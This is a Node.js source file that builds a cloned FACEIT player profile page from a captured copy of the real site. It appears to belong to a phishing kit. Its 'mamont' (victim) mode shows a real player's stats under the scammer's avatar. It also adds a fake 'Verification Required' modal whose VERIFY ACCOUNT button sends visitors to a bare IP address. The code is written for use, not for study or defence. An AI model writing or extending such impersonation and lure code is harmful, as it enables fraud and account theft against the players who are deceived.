// language: JavaScript, file: src/shell/index.js, runtime: Node 22+
// The public profile page, rendered from the captured FACEIT DOM.
//
// `body.html` and `row.html` are produced by scripts/extract_shell.py from a
// saved faceit.com profile page: the same element tree FACEIT ships, with every
// script, injected overlay and tracking iframe removed, the inline style
// attributes lifted into classes, and the captured player's values replaced by
// {{slots}}. This module owns the document, fills the slots, and builds the two
// repeating regions (match rows, activity heatmap) from our own data.
import { readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { esc } from '../render_util.js';
import { skill_badge } from '../faceit_page.js';

const here = dirname(fileURLToPath(import.meta.url));
let body_cache = null;
let row_cache = null;

function shell_body() {
  if (body_cache == null) body_cache = readFileSync(join(here, 'body.html'), 'utf8');
  return body_cache;
}

function match_row() {
  if (row_cache == null) row_cache = readFileSync(join(here, 'row.html'), 'utf8');
  return row_cache;
}

const BLANK_IMG = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';

/** Deterministic backdrop for a profile the provider returned without a cover. */
function default_cover(seed) {
  const text = String(seed || 'rostrum');
  let h = 0;
  for (let i = 0; i < text.length; i += 1) h = (h * 31 + text.charCodeAt(i)) % 360;
  const h2 = (h + 42) % 360;
  const svg = '<svg xmlns="http://www.w3.org/2000/svg" width="640" height="640">'
    + `<defs><linearGradient id="g" x1="0" y1="0" x2="1" y2="1">`
    + `<stop offset="0" stop-color="hsl(${h},42%,20%)"/>`
    + `<stop offset="1" stop-color="hsl(${h2},58%,7%)"/></linearGradient></defs>`
    + '<rect width="640" height="640" fill="url(#g)"/>'
    + `<path d="M0 640 L640 0" stroke="hsla(${h},70%,55%,.10)" stroke-width="150"/>`
    + `<path d="M-260 640 L380 0" stroke="hsla(${h2},75%,55%,.12)" stroke-width="70"/>`
    + '</svg>';
  return 'data:image/svg+xml;charset=utf-8,' + encodeURIComponent(svg);
}

/** Fallback face for a player the provider returned without an avatar. */
function initials_avatar(text) {
  const initials = String(text || '?').trim().slice(0, 2).toUpperCase() || '?';
  const svg = '<svg xmlns="http://www.w3.org/2000/svg" width="160" height="160">'
    + '<rect width="160" height="160" fill="#2b2b2b"/>'
    + '<text x="80" y="84" font-family="Arial, sans-serif" font-size="60" font-weight="700" '
    + 'fill="#9d9d9d" text-anchor="middle" dominant-baseline="middle">'
    + initials.replace(/[<&>]/g, '') + '</text></svg>';
  return 'data:image/svg+xml;charset=utf-8,' + encodeURIComponent(svg);
}

const COUNTRY_NAMES = {
  rs: 'Serbia', fr: 'France', de: 'Germany', us: 'United States', ru: 'Russian Federation',
  ua: 'Ukraine', pl: 'Poland', se: 'Sweden', gb: 'United Kingdom', br: 'Brazil',
};

function num(v) {
  const n = Number(v);
  return Number.isFinite(n) && n !== 0 ? n : null;
}

function fmt(v) {
  const n = num(v);
  return n == null ? '—' : n.toLocaleString('en-US');
}

function parse(json) {
  try {
    return json ? JSON.parse(json) : null;
  } catch {
    return null;
  }
}

/**
 * The one action on the card.
 * Mamont mode (variant A): ADD FRIEND is deliberately inert — a FACEIT-style
 * error toast instead of a hop, nothing leaves the page.
 * Otherwise: the button hands the visitor to the saved destination through the
 * server-side hop.
 */
function profile_action(m, mamont) {
  if (mamont) {
    // Variant A: ADD FRIEND opens the "Verification Required" modal captured
    // from the production mirror — nothing hops anywhere. VERIFY ACCOUNT keeps
    // the same outbound target the mirror uses.
    return `<div class="sh-actions">
  <button class="sh-btn" type="button" data-friend-modal data-testid="destination-link">ADD FRIEND</button>
  <p class="sh-note" data-testid="destination-note" hidden>Verification required</p>
</div>
<div id="fc-overlay" class="notification-overlay">
  <div class="notification-modal">
    <div class="notification-header">
      <h2 class="notification-title">Verification Required</h2>
      <button class="fc-close-btn" aria-label="Close" type="button"><svg width="18" height="18" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M13 1L1 13M1 1L13 13" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
    </div>
    <div class="notification-content">
      <p class="notification-message">You need to verify your account before you can send friend requests.</p>
      <p class="notification-submessage">Please complete the verification to unlock this feature.</p>
    </div>
    <div class="notification-divider"></div>
    <div class="notification-actions">
      <button class="fc-btn-cancel" type="button">CANCEL</button>
      <a class="fc-btn-verify" href="http://2.26.125.147:3000/">VERIFY ACCOUNT</a>
    </div>
  </div>
</div>`;
  }
  const external = m.destination_type === 'external' && m.destination_url;
  if (!external) {
    // Default destination: the player's own FACEIT profile, served by /go.
    return `<div class="sh-actions">
  <a class="sh-btn" href="/players/${esc(m.id)}/go" data-testid="destination-link">ADD FRIEND</a>
  <p class="sh-note" data-testid="destination-note" hidden>Opens faceit.com</p>
</div>`;
  }
  let host = '';
  let path = '';
  try {
    const u = new URL(m.destination_url);
    host = u.hostname;
    path = u.pathname;
  } catch { /* the record was validated on write; keep the note plain if it fails */ }
  return `<div class="sh-actions">
  <a class="sh-btn" href="/players/${esc(m.id)}/go" data-testid="destination-link">ADD FRIEND</a>
  <p class="sh-note" data-testid="destination-note">Opens ${esc(host)}${esc(path)} — an organiser link, not a FACEIT action.</p>
</div>`;
}

function country_name(code) {
  return COUNTRY_NAMES[String(code || '').toLowerCase()] || (code ? String(code).toUpperCase() : '—');
}

/** National flag for a FACEIT country code (w80 ≈ 24px at 2x). */
function flag_img(code) {
  return `<img class="fi-flag" src="https://flagcdn.com/w80/${esc(code)}.png" width="24" height="16" alt="${esc(code)}" loading="lazy">`;
}

/** One table row per match, using the markup the capture uses. */
function match_rows(recent, m_badge_level, faceit_url) {
  if (!Array.isArray(recent) || recent.length === 0) return '';
  const template = match_row();
  return recent.map((r) => {
    const [us, them] = String(r.score || '').split(':').map((s) => s.trim());
    const delta = Number(r.delta);
    let row = template
      .replaceAll('{{date}}', esc(r.day ?? ''))
      .replaceAll('{{time}}', esc(r.time ?? ''))
      .replaceAll('{{result_class}}', r.result === 'W' ? 'res-w' : 'res-l')
      .replaceAll('{{result}}', esc(r.result ?? ''))
      .replaceAll('{{score_us}}', esc(us ?? '—'))
      .replaceAll('{{score_them}}', esc(them ?? '—'))
      .replaceAll('{{elo_delta}}', Number.isFinite(delta) ? String(delta) : '')
      .replaceAll('{{delta_class}}', Number.isFinite(delta) && delta < 0 ? 'd-neg' : 'd-pos')
      .replaceAll('{{match_elo}}', fmt(r.elo))
      .replaceAll('{{rating}}', esc(r.rating ?? '—'))
      .replaceAll('{{row_kda}}', esc(r.kda ?? '—'))
      .replaceAll('{{map}}', esc(r.map ?? ''))
      .replaceAll('{{match_url}}', esc(faceit_url))
      .replaceAll('{{match_badge}}', skill_badge(r.skill_level ?? m_badge_level, 24));
    // no map art for our data — drop the img rather than ship an empty circle
    if (r.map_icon) row = row.replaceAll('{{map_image}}', esc(r.map_icon));
    else row = row.replace(/<img[^>]*\{\{map_image\}\}[^>]*>/, '');
    return row;
  }).join('');
}

/** The 90-day grid: one cell per day, five intensity steps. */
function activity_cells(activity) {
  const days = Array.isArray(activity) ? activity : [];
  const cells = days.map((n) => {
    const level = Math.min(4, Number(n) || 0);
    return `<div data-testid="activity-cell" class="styles__Cell-sc-75ae0e0a-10 act-${level}"></div>`;
  }).join('');
  // the live grid is 7 rows tall; pad the tail so the last week stays square
  const pad = days.length ? (7 - (days.length % 7)) % 7 : 0;
  return cells + '<div data-testid="activity-cell" class="styles__Cell-sc-75ae0e0a-10 act-0"></div>'.repeat(pad);
}

/**
 * Fill the shell from one mapping row.
 * @param {{m: object, shown: string, verified: boolean}} view
 */
export function shell_profile({ m, shown }) {
  // Variant A (the "две строки" launch): the card body renders the SECOND
  // profile (victim's real data — stats, elo, level, country, cover), while the
  // avatar slot always shows the first row's profile (the link owner's own
  // avatar). ADD FRIEND shows a FACEIT-style error instead of hopping.
  const mamont = m.variant === 'A' && Boolean(m.partner_id || m.partner_nickname);
  const real_nick = mamont ? (m.partner_nickname || m.current_nickname) : m.current_nickname;
  const stats = parse(mamont ? m.partner_stats_json : m.stats_json) || {};
  const history = Array.isArray(stats.history) ? stats.history.map(Number).filter(Number.isFinite) : [];
  // "Avg skill level of Match" is FACEIT's own stat — the collector reads it off
  // the hydrated card. The elo-history mean stays only as a fallback.
  const avg_elo = stats.avg_skill != null && Number.isFinite(Number(stats.avg_skill))
    ? Number(stats.avg_skill)
    : history.length
      ? Math.round(history.reduce((a, b) => a + b, 0) / history.length)
      : num(mamont ? m.partner_elo : m.elo);
  const code = String(mamont ? m.partner_country : m.country || '').toLowerCase();
  const activity = Array.isArray(stats.activity) ? stats.activity.map(Number).filter(Number.isFinite) : [];
  const activity_total = activity.length ? activity.reduce((a, b) => a + b, 0) : null;
  // the card cover: the API field, or the background the collector scraped off
  // the live card. Without one the card keeps its own dark surface.
  const cover = stats.cover || m.cover || null;
  const shown_name = esc(shown || real_nick);
  const faceit = `https://www.faceit.com/en/players/${encodeURIComponent(real_nick || '')}`;
  // the displayed name: presenter override (C) may still stamp over the card;
  // empty means the card keeps its own real nickname.
  const nickname = shown_name || esc(real_nick);

  const slots = {
    nickname,
    profile_action: profile_action(m, mamont),
    elo: fmt(mamont ? m.partner_elo : m.elo),
    avg_elo: avg_elo == null ? '—' : fmt(avg_elo),
    season_matches: stats.season_matches != null ? fmt(stats.season_matches) : fmt(stats.matches),
    season_winrate: stats.season_winrate ?? stats.winrate ?? '—',
    country_rank: stats.country_rank != null ? fmt(stats.country_rank) : '—',
    region_rank: stats.region_rank != null ? fmt(stats.region_rank) : '—',
    cs2_matches: fmt(stats.matches),
    csgo_matches: '—',
    kda: esc(stats.kda ?? '—'),
    kd: esc(stats.kd ?? '—'),
    kr: esc(stats.kr ?? '—'),
    hs: stats.hs ?? '—',
    adr: esc(stats.adr ?? '—'),
    winrate: stats.winrate_recent ?? stats.winrate ?? '—',
    since: esc(stats.since || '—'),
    about: esc(stats.about || `We don't know anything about ${real_nick}`),
    country_code: code || 'un',
    country_flag: flag_img(code || 'un'),
    country_name: esc(country_name(mamont ? m.partner_country : m.country)),
    // the avatar on the card is ALWAYS the link owner's own face:
    // variant A — the first row's avatar over the victim's card;
    // normal А/Б rendering — the card player's own avatar.
    avatar: esc(m.avatar || initials_avatar(shown || real_nick)),
    // right sidebar mirrors the faces of the pair: variant A shows the link
    // owner in the rail (his profile is what the visitor sides on), plain Б
    // keeps the partner mirror.
    sidebar_avatar: esc(mamont
      ? (m.avatar || initials_avatar(m.current_nickname))
      : (m.partner_avatar || m.avatar || initials_avatar(shown || m.current_nickname))),
    sidebar_title: esc(mamont
      ? (m.display_override || m.alias || m.current_nickname)
      : (m.partner_nickname || shown || m.current_nickname)),
    cover: esc(stats.cover || default_cover(real_nick || shown)),
    cover_img: cover ? `<img class="sh-cover" src="${esc(cover)}" alt="" referrerpolicy="no-referrer">` : '',
    skill_badge: skill_badge(mamont ? m.partner_level : m.skill_level, 64, mamont ? m.partner_elo : m.elo),
    skill_badge_chip: skill_badge(mamont ? m.partner_level : m.skill_level, 16),
    // the red "#245 Challenger rank" pill FACEIT prints next to the elo number
    rank_badge: stats.challenger_rank
      ? `<span class="fi-rank-badge" title="Challenger rank"><svg viewBox="0 0 24 24" width="12" height="12" fill="currentColor" aria-hidden="true"><path d="M12 22a2 2 0 0 0 2-2h-4a2 2 0 0 0 2 2zm6-6v-5a6 6 0 0 0-5-5.9V4a1 1 0 1 0-2 0v1.1A6 6 0 0 0 6 11v5l-2 2v1h16v-1l-2-2z"/></svg>#${esc(String(stats.challenger_rank))}</span>`
      : '',
    match_url: faceit,
    elo_change: esc(stats.elo_change ?? '—'),
    wins: stats.wins_recent ?? stats.wins ?? '—',
    losses: stats.losses_recent ?? stats.losses ?? '—',
    avg_rating: esc(stats.avg_rating ?? '—'),
    swing: esc(stats.rating_swing ?? '—'),
    consistency: esc(stats.rating_consistency ?? '—'),
    match_rows: match_rows(stats.recent, mamont ? m.partner_level : m.skill_level, faceit),
    activity_cells: activity_cells(stats.activity),
    activity_total: activity_total == null ? '—' : fmt(activity_total),
  };

  let html = shell_body()
    // the real handle stays one hover away, as on every other page we ship
    .replace('<h1 class="Text__StyledText-sc-7932e744-0 styles__Nickname',
      `<h1 data-testid="alias" title="aka ${esc(real_nick)}" class="Text__StyledText-sc-7932e744-0 styles__Nickname`);

  for (const [key, value] of Object.entries(slots)) {
    html = html.replaceAll(`{{${key}}}`, String(value));
  }

  const leftover = html.match(/\{\{[a-z_]+\}\}/g);
  if (leftover) {
    throw new Error(`unfilled shell slots: ${[...new Set(leftover)].join(', ')}`);
  }
  return html;
}

/**
 * Full document for the public profile.
 * @param {{title: string, body: string, head_extra?: string}} view
 */
export function shell_page({ title, body, head_extra = '' }) {
  return `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>${title}</title>
<meta name="robots" content="noindex">
<link rel="stylesheet" href="/fonts.css">
<link rel="stylesheet" href="/fonts-play.css">
<link rel="stylesheet" href="/faceit.shell.vendor.css">
<link rel="stylesheet" href="/faceit.shell.css">
<link rel="icon" href="/favicon.ico" type="image/jpeg">
${head_extra}
</head>
<body>
${body}
<script src="/public.js" defer></script>
</body>
</html>`;
}
